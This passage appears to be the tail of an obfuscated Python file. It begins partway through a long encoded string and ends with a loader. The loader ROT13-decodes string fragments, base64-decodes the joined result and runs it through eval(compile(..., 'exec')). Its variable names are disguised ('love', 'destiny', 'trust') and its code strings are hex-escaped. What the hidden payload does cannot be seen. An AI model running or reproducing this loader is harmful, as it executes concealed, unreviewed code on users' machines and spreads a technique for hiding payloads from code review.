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'; joy = '\x72\x6f\x74\x31\x33'; trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29'); eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')), '<string>', 'exec'))
